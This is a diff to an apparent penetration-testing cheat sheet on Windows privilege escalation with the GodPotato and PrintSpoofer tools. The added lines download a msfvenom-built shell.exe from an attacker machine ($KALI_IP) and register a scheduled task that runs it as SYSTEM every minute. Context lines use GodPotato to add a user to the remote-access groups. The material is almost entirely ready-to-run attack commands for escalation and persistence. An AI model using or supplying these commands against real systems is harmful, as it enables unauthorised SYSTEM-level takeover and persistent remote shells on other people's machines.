@@ -123,6 +123,12 @@ adding user with godpotato.exe
 .\GodPotato.exe -cmd 'net localgroup \"Remote Desktop Users\" test /add'
 .\GodPotato.exe -cmd 'net localgroup \"Remote Management Users\" test /add'
 ```
+or add to scheduled tasks, generate shell.exe using msfvenom:
+```powershell
+iwr $KALI_IP/shell.exe -outfile c:\windows\tasks\shell.exe
+./godpotato -cmd 'cmd /c SCHTASKS /CREATE /SC MINUTE /TN "shell" /TR "c:\windows\tasks\shell.exe" /RU "SYSTEM" /MO 1'
+./godpotato -cmd 'cmd /c SCHTASKS /RUN /TN "shell"'
+```
 
 ```bash
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
